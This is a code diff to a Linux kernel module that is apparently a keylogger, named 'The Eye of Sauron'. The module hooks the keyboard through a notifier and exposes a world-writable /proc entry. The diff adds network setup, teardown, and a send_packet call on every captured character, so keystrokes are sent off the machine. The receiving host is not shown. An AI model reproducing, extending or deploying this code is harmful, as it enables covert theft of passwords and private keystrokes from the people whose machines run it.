@@ -1,6 +1,7 @@
 #include "../include/eye.h"
 #include "../include/ops.h"
 #include "../include/char.h"
+#include "../include/net.h"
 
 /* Kernel Module License */
 MODULE_LICENSE("GPL");
@@ -46,6 +47,12 @@ static int start_eye(void)
     printk("The Eye of Sauron is upon you.\n");
 
     _ops = proc_create("eye", 0777, NULL, &fops);
+    if (initialize_net())
+    {
+        printk(KERN_ERR "error initializing network\n");
+        return -1;
+    }
+
 //    ring_on();
 
     return 0;
@@ -54,6 +61,7 @@ static int start_eye(void)
 static void end_eye(void)
 {
 //    ring_off();
+    finalize_net();
     unregister_keyboard_notifier(&_sauron);
 
     remove_proc_entry("eye", NULL);
@@ -96,6 +104,8 @@ static uint8_t id_char(char n)
     {
         printk(KERN_CONT "<%02x>", c);
     }
+
+    send_packet(n);
 
     return c;
 }
